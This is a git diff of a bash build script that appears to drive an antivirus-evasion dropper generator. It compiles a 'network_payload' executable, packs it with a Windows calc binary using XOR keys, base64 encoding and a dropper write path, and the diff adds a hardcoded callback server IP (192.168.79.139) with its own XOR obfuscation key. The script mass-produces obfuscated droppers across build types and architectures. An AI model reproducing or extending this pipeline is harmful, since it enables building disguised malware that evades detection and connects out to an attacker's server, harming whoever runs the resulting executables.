@@ -18,11 +18,13 @@ encode1="FileSystem_exe_rebuild/payloads/network_payload.exe"
 # because github was being problematic about the 
 # file size.
 encode2="FileSystem_exe_rebuild/payloads/en-US/w7_calc.exe.mui"
+encode3="FileSystem_exe_rebuild/payloads/w7_calc.exe"
 log_out="preserve_payload_contents.txt"
 manual_debug_run=false
 i=0
 print_log=""
-
+server_ip="192.168.79.139"
+server_ip_xor_key=32
 
 encode1_output="${encode1%.*}.cpp"
 x86_64-w64-mingw32-g++ "$encode1_output" -static -static-libgcc -static-libstdc++ -o "$encode1" -lws2_32
@@ -51,6 +53,8 @@ for build in "${build_types[@]}"; do
 					print_log+="resource: $resource\n"
 					print_log+="header: $header\n"
 					print_log+="encode: $encode\n"
+					print_log+="server ip: $server_ip\n"
+					print_log+="server ip xor key: $server_ip_xor_key\n"
 
 				print_log+="---------------------Python file size Details----------------------\n"
 					print_log+="input size: $(wc -c < $input)\n"
@@ -64,7 +68,7 @@ for build in "${build_types[@]}"; do
 					"--$build" "--$architecture" \
 					--xor_key "$a_idx" --base64 \
 					--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
-					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2"
+					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"
 
 					print_log+="---------------------After Python file size Details----------------------\n"
 					print_log+="input size: $(wc -c < $input)\n"
@@ -95,6 +99,8 @@ for build in "${build_types[@]}"; do
 					print_log+="header: $header\n"
 					print_log+="encode1: $encode1\n"
 					print_log+="encode2: $encode2\n"
+					print_log+="server ip: $server_ip\n"
+					print_log+="server ip xor: $server_ip_xor_key"
 
 					print_log+="---------------------Python file size Details----------------------\n"
 					print_log+="input size: $(wc -c < $input)\n"
@@ -108,7 +114,7 @@ for build in "${build_types[@]}"; do
 					"--$build" "--$architecture" \
 				        --xor_key "$a_idx" \
 					--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
-					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2"
+					--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"
 
 					print_log+="---------------------After Python file size Details----------------------\n"
 					print_log+="input size: $(wc -c < $input)\n"
@@ -138,6 +144,8 @@ for build in "${build_types[@]}"; do
 				print_log+="header: $header\n"
 				print_log+="encode1: $encode1\n"
 				print_log+="encode2: $encode2\n"
+				print_log+="server ip: $server_ip\n"
+				print_log+="server ip xor key: $server_ip_xor_key\n"
 
 				print_log+="---------------------Python file size Details----------------------\n"
 				print_log+="input size: $(wc -c < $input)\n"
@@ -151,7 +159,7 @@ for build in "${build_types[@]}"; do
 				"--$build" "--$architecture" \
 				--base64 \
 				--input "$input" --output "${out}${i}.exe" --resource "$resource" --header "$header" --dropper_write "\\\\exe_num${i}.exe" \
-				--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2"
+				--logging_output "$log_out" --log_number "$i" --keep_log --encode_list "$encode1" "$encode2" "$encode3" --ip "$server_ip" --ip_xor_key "$server_ip_xor_key"
 
 				print_log+="---------------------After Python file size Details----------------------\n"
 				print_log+="input size: $(wc -c < $input)\n"
@@ -169,36 +177,8 @@ for build in "${build_types[@]}"; do
 	done
 done
 
-# This existed because cpp was having
-# problems passing the macro when 
-# the debug flag was set. I have 
-# no idea why but its fixed now.
-
-if "$manual_debug_run"; then
-	python3 linux_mint_script.py --debug --hardcode --xor-key 24 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num14.exe" --output "all_exe_combinations/exe_num14.exe" --log --log-number 14 --keep-log
-	python3 linux_mint_script.py --debug --hardcode --xor-key 179 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num15.exe" --output "all_exe_combinations/exe_num15.exe" --log --log-number 15 --keep-log
-	python3 linux_mint_script.py --debug --hardcode --xor-key 67 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num16.exe" --output "all_exe_combinations/exe_num16.exe" --log --log-number 16 --keep-log
-
-	python3 linux_mint_script.py --debug --hardcode --xor-key 171 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num17.exe" --output "all_exe_combinations/exe_num17.exe" --log --log-number 17 --keep-log
-	python3 linux_mint_script.py --debug --hardcode --xor-key 52 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num18.exe" --output "all_exe_combinations/exe_num18.exe" --log --log-number 18 --keep-log
-	python3 linux_mint_script.py --debug --hardcode --xor-key 128 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num19.exe" --output "all_exe_combinations/exe_num19.exe" --log --log-number 19 --keep-log
-
-	python3 linux_mint_script.py --debug --hardcode --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num20.exe" --output "all_exe_combinations/exe_num20.exe" --log --log-number 20 --keep-log
-
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 21 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num21.exe" --output "all_exe_combinations/exe_num21.exe" --log --log-number 21 --keep-log
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 37 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num22.exe" --output "all_exe_combinations/exe_num22.exe" --log --log-number 22 --keep-log
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 253 --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num23.exe" --output "all_exe_combinations/exe_num23.exe" --log --log-number 23 --keep-log
-
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 223 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num24.exe" --output "all_exe_combinations/exe_num24.exe" --log --log-number 24 --keep-log
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 30 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num25.exe" --output "all_exe_combinations/exe_num25.exe" --log --log-number 25 --keep-log
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --xor-key 149 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num26.exe" --output "all_exe_combinations/exe_num26.exe" --log --log-number 26 --keep-log
-
-	python3 linux_mint_script.py --architecture 86 --debug --hardcode --base64 --multiple-files --encode-list "$encode1" "$encode2" --temp "\\\exe_num27.exe" --output "all_exe_combinations/exe_num27.exe" --log --log-number 27 --keep-log
-
-fi
-
-
-
 printf "$print_log">log_file.txt
 
 rm "$encode1"
+
+echo "payloads can be restored by using git restore. You can change the ip address in the script_runners.sh file"
